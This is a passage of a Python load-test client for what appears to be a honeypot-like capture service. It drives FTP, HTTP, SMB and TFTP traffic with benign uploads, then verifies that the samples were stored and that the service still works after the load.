        due = [item for item in STATS.expected if item[0] < now() - grace]
        STATS.expected = [item for item in STATS.expected if item[0] >= now() - grace]
    missing = []
    for _, md5, size in due:
        path = DATA / "binaries" / md5
        try:
            info = path.stat()
        except OSError:
            missing.append(md5)
            continue
        if info.st_size != size or info.st_mode & 0o777 != 0o440:
            missing.append(md5)
    return len(due), missing


def verifier(stop, state):
    while not stop.wait(15):
        checked, missing = verify_expected()
        state["checked"] += checked
        state["missing"].extend(missing)


# ---------------------------------------------------------------- afterwards

def post_checks():
    """New connections and an upload still work."""
    results = {}

    def attempt(name, function):
        try:
            results[name] = function() or True
        except Exception as error:
            results[name] = "%s: %s" % (type(error).__name__, str(error)[:200])

    def ftp_banner():
        return banner() < 5

    def smb_login():
        conn = SMBConnection(HOST, HOST, sess_port=445, preferredDialect=SMB_DIALECT, timeout=20)
        try:
            conn.login("after", "secret")
            return bool(conn.connectTree("IPC$"))
        finally:
            conn.close()

    def smb2_negotiate():
        with test_smb_auth.connect(HOST) as sock:
            sock.sendall(test_smb_auth.negotiate())
            return struct.unpack_from("<I", test_smb_auth.receive(sock), 8)[0] == 0

    def tftp():
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.settimeout(10)
            sock.sendto(test_tftp._rrq(b"functional-test.txt"), (HOST, 69))
            reply, _ = sock.recvfrom(4096)
            return reply[4:] == test_tftp.EXPECTED

    def stored(content, timeout=30):
        md5 = hashlib.md5(content).hexdigest()
        deadline = time.monotonic() + timeout
        path = DATA / "binaries" / md5
        while not path.exists() and time.monotonic() < deadline:
            time.sleep(0.2)
        return path.read_bytes() == content and path.stat().st_mode & 0o777 == 0o440

    def ftp_upload():
        content = ("post-run ftp upload %s\n" % uuid.uuid4().hex).encode() * 50
        with socket.create_connection((HOST, 21), timeout=20) as ctrl:
            assert test_ftp._read_reply(ctrl).startswith("220")
            test_ftp._command(ctrl, "USER anonymous")
            assert test_ftp._command(ctrl, "PASS x@y").startswith("230")
            with test_ftp._passive_data_socket(ctrl, HOST) as data_sock:
                assert test_ftp._command(ctrl, "STOR post-run.bin").startswith("150")
                data_sock.sendall(content)
            assert test_ftp._read_reply(ctrl).startswith("226")
            test_ftp._command(ctrl, "QUIT")
        return stored(content)

    def http_upload():
        content = ("post-run http upload %s\n" % uuid.uuid4().hex).encode() * 50
        boundary = "post" + uuid.uuid4().hex
        body = test_smoke._file_part(boundary, content) + ("--%s--\r\n" % boundary).encode()
        response, _ = test_smoke._post_multipart(HOST, body, boundary, timeout=20)
        assert response.startswith(b"HTTP/1.")
        return stored(content)

    def smb_upload():
        content = ("post-run smb upload %s\n" % uuid.uuid4().hex).encode() * 50
        conn = SMBConnection(HOST, HOST, sess_port=445, preferredDialect=SMB_DIALECT, timeout=30)
        try:
            conn.login("after", "secret")
            tid = conn.connectTree("C$")
            fid = conn.createFile(tid, "\\post-run.bin")
            conn.writeFile(tid, fid, content, 0)
            conn.closeFile(tid, fid)
        finally:
            conn.close()
        return stored(content)

    for name, function in (("ftp_banner", ftp_banner), ("smb1_login", smb_login), ("smb2_negotiate", smb2_negotiate),
                           ("tftp_rrq", tftp), ("ftp_upload_stored", ftp_upload),
                           ("http_upload_stored", http_upload), ("smb_upload_stored", smb_upload)):
        attempt(name, function)
    return results


# ---------------------------------------------------------------- main

def main():
    global POOL, CONTENT, UNIQUE_SHARE
    parser = argparse.ArgumentParser()
    parser.add_argument("--duration", type=float, required=True, help="seconds of load")
    parser.add_argument("--concurrency", type=int, default=8)
    parser.add_argument("--idle", type=int, default=4, help="threads with idle / slow connections")
    parser.add_argument("--think-ms", type=float, default=0.0, help="mean pause of a worker between scenarios")
    parser.add_argument("--interval", type=float, default=30.0)
    parser.add_argument("--settle", type=float, default=30.0, help="seconds without load before the checks afterwards")
    parser.add_argument("--seed", type=int, default=1)
    parser.add_argument("--unique-share", type=float, default=UNIQUE_SHARE,
                        help="share of the uploads that are a new sample (default 0.15, the rest comes from a "
                             "pool of 48)")
    parser.add_argument("--only", default="", help="comma separated scenarios (debugging): the mix of these only")
    args = parser.parse_args()
    UNIQUE_SHARE = args.unique_share
    if args.only:
        wanted = args.only.split(",")
        unknown = [name for name in wanted if name not in FUNCTIONS]
        assert not unknown, "unknown scenarios %s, known: %s" % (unknown, ", ".join(FUNCTIONS))
        NAMES[:] = [name for name in NAMES if name in wanted]
        WEIGHTS[:] = [weight for name, weight, _ in SCENARIOS if name in wanted]

    POOL = make_pool(args.seed)
    my_ip = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    my_ip.connect((socket.gethostbyname(HOST), 9))
    address = my_ip.getsockname()[0]
    my_ip.close()
    CONTENT = Content(POOL, address)
    http_server = TrimmedHttpServer(CONTENT, address)
    CONTENT.http_port = http_server.port
    tftp_server = CountingTftp(TftpFiles(CONTENT), address)
    tftp_server.start()

    stop = threading.Event()
    stop_load = threading.Event()
    state = {"checked": 0, "missing": []}
    mirror_stop = threading.Event()
    helpers_threads = [
        threading.Thread(target=banner_probe, args=(stop, state), daemon=True),
        threading.Thread(target=sampler, args=(stop, args.interval, state), daemon=True),
        threading.Thread(target=verifier, args=(stop, state), daemon=True),
        threading.Thread(target=mirror_listener, args=(mirror_stop,), daemon=True),
    ]
    for thread in helpers_threads:
        thread.start()
    time.sleep(1)

    # one pass of every scenario first: a scenario that does not work at all is a bug of the test
    rnd = random.Random(args.seed)
    for name in NAMES:
        ok = run_scenario(name, rnd)
        print("warm-up %-22s %s" % (name, "ok" if ok else "FAILED " + str(STATS.errors[name][-1:])), flush=True)

    load_start = now()
    end = time.monotonic() + args.duration
    (OUT / "phase.json").write_text(json.dumps({"load_start": load_start, "load_end": None}))
    workers = [threading.Thread(target=worker, args=(i, args.seed, end, args.think_ms / 1000, stop_load), daemon=True)
               for i in range(args.concurrency)]
    workers += [threading.Thread(target=background, args=(i, args.seed, end, stop_load), daemon=True)
                for i in range(args.idle)]
    for thread in workers:
        thread.start()
    while any(thread.is_alive() for thread in workers):
        time.sleep(1)
        if time.monotonic() > end + 120:
            print("workers did not end within 120 s of the deadline", flush=True)
            break
    load_end = now()
    (OUT / "phase.json").write_text(json.dumps({"load_start": load_start, "load_end": load_end}))
    print("load done after %.0f s" % (load_end - load_start), flush=True)
    time.sleep(args.settle)

    post = post_checks()
    # the last uploads of the load, and those of the checks, have a grace of their own
    time.sleep(65)
    checked, missing = verify_expected(grace=60)
    state["checked"] += checked
    state["missing"].extend(missing)
    stop.set()
    mirror_stop.set()

    banner_rows = []
    with (OUT / "banner.csv").open() as file:
        next(file)
        for line in file:
            parts = line.rstrip("\n").split(",")
            if len(parts) == 3:
                banner_rows.append((float(parts[0]), float(parts[1]), parts[2]))
    with STATS.lock:
        scenarios = {name: {"ok": STATS.ok[name], "err": STATS.err[name], "seconds": round(STATS.seconds[name], 1),
                            "errors": STATS.errors.get(name, [])}
                     for name in NAMES + [name for name, _ in BACKGROUND]}
    result = {
        "load_start": load_start, "load_end": load_end, "duration_requested": args.duration,
        "concurrency": args.concurrency, "idle_threads": args.idle, "think_ms": args.think_ms, "seed": args.seed,
        "scenarios": scenarios,
        "connections_made": CONNECTIONS["count"],
        "upload_bytes": STATS.upload_bytes,
        "uploads_checked": state["checked"], "uploads_missing": state["missing"][:20],
        "uploads_missing_count": len(state["missing"]),
        "mirror_connect_backs": MIRROR["connect_backs"],
        "tftp_requests_served": tftp_server.count, "http_requests_served": http_server.count,
        "banner_samples": len(banner_rows),
        "post": post,
        "banner": [(round(at, 2), latency) for at, latency, _ in banner_rows[::20]],
    }
    (OUT / "result.json").write_text(json.dumps(result, indent=1) + "\n")
    tftp_server.close()
    http_server.close()
    print("client done", flush=True)
    return 0


if __name__ == "__main__":
    sys.exit(main())
